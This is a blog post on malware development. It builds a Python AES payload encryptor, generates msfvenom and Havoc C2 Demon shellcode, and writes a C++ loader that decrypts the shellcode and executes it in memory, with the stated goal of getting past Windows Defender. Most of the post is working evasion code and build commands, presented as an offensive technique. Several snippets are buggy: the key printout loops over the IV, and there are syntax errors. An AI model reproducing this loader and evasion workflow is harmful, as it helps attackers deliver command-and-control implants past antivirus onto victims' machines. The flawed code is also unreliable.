---
layout: post
title: Creating a payload encryption tool and testing it on the Havoc agent
date: 2023-12-2
categories: [Malware Development, Evasion]
tags: [evasion]     
---

Payload encryption is a must against modern security solutions, as popular code such as meterpreter is sure to get caught by signature-based detection or static file analysis. Although encryption won't get us past heuristic analysis or ML behavioral analysis, it's a step forward toward being stealthy. While this is great, the drawback to payload encryption is that it increases file entropy. Entropy is a measure of randomness within a dataset, and files with an entropy that passes a certain threshold have a good chance of being marked as malicious. There are techniques to decrease entropy, which I will discuss in a later post. 

In this post, I will create a tool that implements a popular encryption algorithm for malware development. The tool will output the encrypted payload and generate a random key and initialization vector. Afterward, I will test out an encrypted payload against Defender. 

Let's create an argument parser using the `argparse` library

```python
# Create the argument parser
parser = argparse.ArgumentParser(
                        prog='PayloadEncryptor',
                        description='Encrypts payloads...duh.',
                        epilog='Check out my blog!')

# Adding arguments to the parser
parser.add_argument('-i', dest = 'initialpayload', help = 'the name of the file that contains your payload', type=argparse.FileType('rb'))
parser.add_argument('-o', dest = 'encryptedpayload', help = 'the file where to write the encrypted payload')

# Run the parser and place the extracted data into an args.<argumentname> object
args = parser.parse_args()
# Read the payload from a file and store it in a variable
with args.initialpayload as f:
   payload = f.read()
```

Then I will create a function that takes the payload, encrypts it, and writes the output to the file the user specified. For this, I will be using the `PyCryptodome` library, as it makes my life easier.

```python
def EncryptAES(input, output):
	# Generate a random key and print it
    key = get_random_bytes(16)
    print(key)
	# Define the cipher as AES-EAX
    cipher = AES.new(key, AES.MODE_EAX)
	# Generate a nonce
    nonce = cipher.nonce
	# Encrypt the input
    ciphertext, tag = cipher.encrypt_and_digest(input)
	# Open or create a file with the name we specified, and write the encrypted payload
    file_out = open(f"{output}", "wb")
    [ file_out.write(x) for x in (cipher.nonce, tag, ciphertext) ]
```

Now let's put it to the test! But first, we will need a payload. 

```shell
msfvenom -p windows/x64/messagebox TEXT="Task failed succesfully" TITLE="Error!" -f raw > payload.bin
```

Let's take a look at it 

![Message box payload](/assets/image3.png)

Now if we run our code, it should look different

```python
python3 Encrypt.py -i payload.bin -o encryptedpayload.bin
```

![Encrypted message box payload](/assets/image4.PNG)

Perfect! So we know that it works, but our payload isn't that interesting. Let's use the Havoc C2 framework to create a payload for the Demon agent (don't forget to start a listener first). This command should create a .bin file.

![Generating the demon agent](/assets/image5.png)

We run our encryption script again, and we have our final payload. But now we need a loader. Let's try this going off this [template](https://github.com/TheD1rkMtr/Shellcode-Hide/blob/main/1%20-%20Simple%20Loader/SimpleLoader/SimpleLoader.cpp). After tweaking the code a bit, this is the final product:

```cpp
#include <windows.h>
#include <stdio.h>

int main() {

unsigned char payload[] = { 
    <SNIP>
};
  
	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	
	RtlMoveMemory(alloc_mem, payload, sizeof(payload));

	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}

  ((void(*)())alloc_mem)();

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	getchar();

	return 0;
}
```

We will also need to decrypt our payload. For this I will use the [tiny-aes-c](https://github.com/kokke/tiny-AES-c) library.

```cpp
    #include <aes.c>

    <SNIP>

    AES_ctx ctx = {0};
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, payload, sizeof(payload));
```

Here is when I ran into a problem. The python script I created encrpted the payload using AES-EAX, and tiny-aes-c uses AES_CBC. Let's adapt our script

```python
def EncryptAES(input, output):
    # Generate a key
    key = get_random_bytes(16)
    # Defining a cipher
    cipher = AES.new(key, AES.MODE_CBC)
    # Encrypting the payload, also adding some padding in case it's size is not a multiple of 16 bytes
    ct_bytes = cipher.encrypt(pad(input, AES.block_size))
    # Print the IV
    print("unsigned char iv[] = {")
    for byte in cipher.iv:
        print(f"0x{byte:02x},", end = "")
    print("};")
    # Print the Key
    print("unsigned char key[] = {")
    for byte in cipher.iv:
        print(f"0x{byte:02x},", end = "")
    print("};")
    # Write into the specified file
    file_out = open(f"{output}", "wb")
    [ file_out.write(ct_bytes) ]
```

And after using THIS script to encrypt our payload, this is the final product

```cpp
unsigned char key[] = {
  0x7b, 0x61, 0x4f, 0xef, 0xbf, 0xbd, 0x78, 0x42, 0xef, 0xbf, 0xbd, 0x5b,
  0x31, 0x6d, 0x25, 0x0a
};

unsigned char iv[] = {
  0xef, 0xbf, 0xbd, 0x45, 0xc9, 0xbd, 0x34, 0xef, 0xbf, 0xbd, 0x54, 0x6a,
  0xef, 0xbf, 0xbd, 0x55, 0xef, 0xbf, 0xbd, 0x5b, 0x31, 0x6d, 0x0a
};

int main() {

unsigned char payload[] = {
  <SNIP>
};
    // Allocate read-write memory the size of our payload
  	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload)), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}

	// Decrypt payload
  AES_ctx ctx = {0};
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, payload, sizeof(payload));

  // Copy decrypted payload into memory
	RtlMoveMemory(alloc_mem, payload, sizeof(payload));

	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}
  // Cast a function pointer to our payload.
  ((void(*)())alloc_mem)();

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	getchar();

	return 0;
}
```

Now that we have our code, let's compile it!

```shell
x86_64-w64-mingw32-gcc -I /Path/to/tiny-AES-c-1.0.0 -o Demon.exe Loader.cpp
```

After transferring it to the Windows machine, I ran it and...the agent crashed. Great. After debugging it a bit, I have come to the conclusion that I also need to use tiny-aes-c for encryption. 

```cpp
unsigned char payload[] {
<SNIP>
};

unsigned char key[] {
};

unsigned char iv[] {
};

AES_ctx ctx = {0};
AES_init_ctx_iv(&ctx, key, iv);
AES_CBC_encrypt_buffer(&ctx, payload, sizeof(payload));

for(int i=0,i<sizeof(payload),i++) {
  print("0x%x, ", payload[i]);
}
```

Piping the output of this into a file, and then copying it to our loader. It should work. Compiling it again and running it on our Windows host...

![Defender got pwned](/assets/image7.png)
